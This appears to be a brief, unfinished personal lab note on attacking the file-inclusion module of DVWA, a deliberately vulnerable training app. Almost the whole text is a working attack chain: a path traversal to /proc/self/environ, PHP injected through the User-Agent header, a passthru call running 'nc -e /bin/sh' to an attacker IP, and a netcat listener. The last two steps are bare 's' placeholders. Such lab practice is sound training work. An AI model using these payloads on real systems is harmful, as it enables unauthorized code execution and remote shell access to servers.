# DVWA

## File Inclusion
1. *"USER_AGENT"* has shown from this path
   - ```10.20.14.209/dvwa/vulnerabilities/fi/?page=../../../../../proc/self/environ```
2. Intercept request and modify to ```<?phpinfo();?>``` for test
3. Modify to ```<?passthru("nc -e /bin/sh 10.20.14.208 8888");?>``` for Reverse-shell
4. Attacker machine: ```nc -vv -l -p 8888```
5. s
6. s
